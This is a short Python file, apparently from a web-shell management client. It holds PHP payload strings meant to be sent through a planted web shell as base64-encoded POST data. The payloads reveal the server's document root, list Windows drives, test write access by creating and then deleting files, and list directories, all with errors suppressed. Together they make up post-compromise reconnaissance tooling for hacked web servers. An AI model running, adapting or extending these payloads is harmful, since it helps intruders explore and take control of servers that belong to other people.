#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#BY: QQ292925842

#获取网站路径
php_www_path="""
<?php
@ini_set("display_errors","0");   //错误不显示
@set_time_limit(0);    //设置程序执行时间
@set_magic_quotes_runtime(0);  //特殊字符0-关闭
echo("->|");
echo $_SERVER['DOCUMENT_ROOT']."/";   //获取程序根目录
echo("|<-");
die();
?>
"""
#获取win磁盘号
php_win_def="""
<?php
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");;
if(substr($D,0,1)!="/")
{
	foreach(range("A","Z") as $L)
	if(is_dir("{$L}:"))
	$R.="{$L}:";
}
print $R;
echo("|<-");
die();
?>
"""
#获取目录权限
PHP_qx_path="""
<?php
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$filename=base64_decode($_POST["z1"]);
//$filename="D:/wamp/www/data/index.html";
////$filename=str_replace('\\','/',$filename);
//$file_hd2=@fopen($filename,'w');  //打开文件不存在则创建
////if(!$file_hd2){
////	@fclose($file_hd2);
////	echo("1");
////}else{
////	echo("0");
////}
//if(is_file($filename)){   //检查指定的文件名是否是正常的文件
//    //文件不可写，直接返回
//	if(is_writable($filename)){   //判断文件是否存在
//		echo("1");
//		}
//}
//@unlink($filename);  //删除文件
echo @fopen($filename,"w")?"1":"0";
@unlink($filename);  //删除文件
echo("|<-");
die();
?>
"""

PHP_ml_list="""
<?php
<?php
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$D=base64_decode($_POST["z1"]);
//$D="D:/wamp/www";
//$D=$_SERVER['DOCUMENT_ROOT'];   //获取程序根目录
$F=@opendir($D);  //打开 images 目录
if($F==NULL)
{
echo("ERROR: Path Not Found Or No Permission!");
}
else
{
while($N=@readdir($F))
{$P=$D."/".$N;
if(@is_dir($P))//目录
{
if (!(($N==".")or($N=="..")))  //只要文件夹
{
	echo($D."/".$N);
	echo("\t");
}
}
}
};
echo("|<-");
die();
?>
"""



